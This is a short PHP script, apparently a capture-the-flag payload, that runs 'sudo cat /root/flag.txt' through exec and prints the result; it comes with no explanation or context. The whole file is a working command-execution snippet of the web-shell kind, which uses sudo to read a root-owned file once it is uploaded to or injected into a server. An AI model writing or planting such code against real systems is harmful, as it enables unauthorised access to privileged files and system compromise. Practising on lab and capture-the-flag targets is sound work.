<?php
	$output=null;
	$retvall=null;
	exec("sudo cat /root/flag.txt", $output, $retvall);
	print_r($output);
?>
